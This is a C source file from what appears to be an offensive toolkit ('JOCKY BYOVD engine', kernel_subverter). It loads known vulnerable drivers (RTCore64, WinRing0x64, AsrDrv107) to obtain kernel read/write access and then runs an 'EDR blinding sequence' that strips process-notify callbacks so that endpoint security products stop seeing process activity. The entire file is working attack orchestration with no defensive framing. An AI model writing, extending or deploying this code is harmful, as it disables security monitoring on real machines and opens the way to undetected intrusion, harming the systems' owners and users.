/*
 * byovd.c -- JOCKY BYOVD engine: thin orchestrator
 * byovd/kernel_subverter/byovd.c
 */
#include "byovd.h"

byovd_backend_t *byovd_engine_init(byovd_backend_id_t id,
                                    const char        *driver_path)
{
    if (!driver_path) { printf("[byovd] driver_path is NULL\n"); return NULL; }

    byovd_backend_t *backend = NULL;

    switch (id) {
        case BYOVD_BACKEND_RTCORE64:
            printf("[byovd] backend: RTCore64\n");
            backend = rtcore64_backend_init(driver_path);
            break;

        case BYOVD_BACKEND_WINRING0:
            printf("[byovd] backend: WinRing0x64\n");
            backend = winring0_backend_init(driver_path);
            break;

        case BYOVD_BACKEND_ASRDRV107:
            printf("[byovd] backend: AsrDrv107\n");
            backend = asrdrv107_backend_init(driver_path);
            break;

        case BYOVD_BACKEND_AUTO:
            printf("[byovd] AUTO -- probing AsrDrv107\n");
            backend = asrdrv107_backend_init(driver_path);
            break;

        default:
            printf("[byovd] unknown backend id: %d\n", (int)id);
            return NULL;
    }

    if (!backend) {
        printf("[byovd] backend_init returned NULL\n");
        return NULL;
    }

    byovd_result_t r = backend->ops.load(backend);
    if (r != BYOVD_OK) {
        printf("[byovd] driver load failed: %s\n", byovd_result_str(r));
        free(backend->private_ctx); free(backend);
        return NULL;
    }

    r = backend->ops.open(backend);
    if (r != BYOVD_OK) {
        printf("[byovd] device open failed: %s\n", byovd_result_str(r));
        backend->ops.unload(backend);
        free(backend->private_ctx); free(backend);
        return NULL;
    }

    printf("[byovd] backend [%s] armed -- kernel r/w ready\n", backend->name);
    return backend;
}

int byovd_engine_run(byovd_backend_t *backend)
{
    if (!backend) { printf("[byovd] NULL backend\n"); return -1; }
    printf("[byovd] starting EDR blinding sequence\n");
    printf("[byovd] backend: %s\n\n", backend->name);

    int removed = scrub_edr_callbacks(backend);
    if (removed < 0) { printf("[byovd] callback scrub failed\n"); return -1; }

    printf("\n[byovd] EDR blinding complete\n");
    printf("[byovd]   process-notify callbacks removed: %d\n", removed);
    return removed;
}

void byovd_engine_cleanup(byovd_backend_t *backend)
{
    if (!backend) return;
    printf("[byovd] cleanup: closing device and unloading driver\n");
    backend->ops.close(backend);
    byovd_result_t r = backend->ops.unload(backend);
    if (r != BYOVD_OK)
        printf("[byovd] unload warning: %s\n", byovd_result_str(r));
    free(backend->private_ctx);
    free(backend);
    printf("[byovd] cleanup done\n");
}